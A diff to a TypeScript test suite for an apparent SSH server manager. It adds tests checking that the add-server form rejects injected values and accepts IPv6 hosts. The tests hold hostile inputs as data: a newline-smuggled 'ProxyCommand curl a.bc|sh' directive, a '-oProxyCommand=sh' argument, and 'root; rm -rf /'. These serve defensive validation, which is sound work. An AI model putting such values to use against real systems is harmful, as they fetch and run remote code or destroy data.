@@ -35,12 +35,14 @@ function hash(file: string): string {
   return createHash("sha256").update(readFileSync(file)).digest("hex");
 }
 
-/** A home of its own, with the ~/.ssh/config the app must never touch. */
 function fakeHome(): { home: string; sshConfig: string } {
   const home = mkdtempSync(join(tmpdir(), "pupitre-home-"));
   const dir = join(home, ".ssh");
+
   mkdirSync(dir, { mode: 0o700, recursive: true });
+
   const sshConfig = join(dir, "config");
+
   writeFileSync(sshConfig, SYSTEM_CONFIG, { mode: 0o600 });
 
   return { home, sshConfig };
@@ -75,15 +77,20 @@ describe("le parcours d'ajout d'un serveur", () => {
       [],
       paths
     );
+
     writeSshConfig(created.servers, paths);
+
     const pinned = pinFingerprint(
       created.servers,
       created.server.id,
       "SHA256:x"
     );
+
     writeSshConfig(pinned, paths);
     await untrustHost(created.server, paths);
+
     const left = removeServer(pinned, created.server.id, paths);
+
     writeSshConfig(left, paths);
 
     expect(hash(sshConfig)).toBe(before);
@@ -248,6 +255,47 @@ describe("ce que le formulaire refuse", () => {
     expect(
       addServer({ ...draft, user: "root; rm -rf /" }, [], paths)
     ).rejects.toBeInstanceOf(SetupError);
+  });
+
+  it("refuse une adresse ou un compte qui ajouterait une directive SSH", async () => {
+    const paths = pathsIn(userData());
+    const injection = "x\nProxyCommand curl a.bc|sh";
+    const draft = {
+      host: "203.0.113.10",
+      key: { mode: "generate" } as const,
+      name: "Staging",
+      port: 22,
+      user: "root",
+    };
+
+    await expect(
+      addServer({ ...draft, user: injection }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.user" } });
+    await expect(
+      addServer({ ...draft, host: injection }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
+    await expect(
+      addServer({ ...draft, host: "-oProxyCommand=sh" }, [], paths)
+    ).rejects.toMatchObject({ phrase: { id: "refusal.setup.host" } });
+  });
+
+  it("accepte une adresse IPv6", async () => {
+    const paths = pathsIn(userData());
+    const created = await addServer(
+      {
+        host: "2001:db8::10",
+        key: { mode: "generate" },
+        name: "Staging",
+        port: 22,
+        user: "root",
+      },
+      [],
+      paths
+    );
+
+    expect(renderSshConfig(created.servers, paths)).toContain(
+      "  HostName 2001:db8::10"
+    );
   });
 
   it("porte un remède avec son refus", async () => {
